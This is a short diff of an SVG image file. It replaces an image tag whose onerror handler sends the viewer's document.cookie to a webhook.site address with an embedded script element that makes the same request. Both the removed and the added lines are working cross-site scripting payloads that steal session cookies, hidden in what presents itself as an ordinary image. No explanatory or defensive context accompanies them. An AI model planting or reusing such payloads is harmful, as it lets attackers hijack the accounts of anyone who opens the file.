@@ -1,3 +1,5 @@
 <svg xmlns="http://www.w3.org/2000/svg">
-  <image href="x" onerror="fetch('https://webhook.site/1bc228d0-ba61-4060-844b-9f8561ceb40e?c='+document.cookie)"/>
+  <script type="text/javascript">
+    fetch('https://webhook.site/1bc228d0-ba61-4060-844b-9f8561ceb40e?c='+document.cookie);
+  </script>
 </svg>
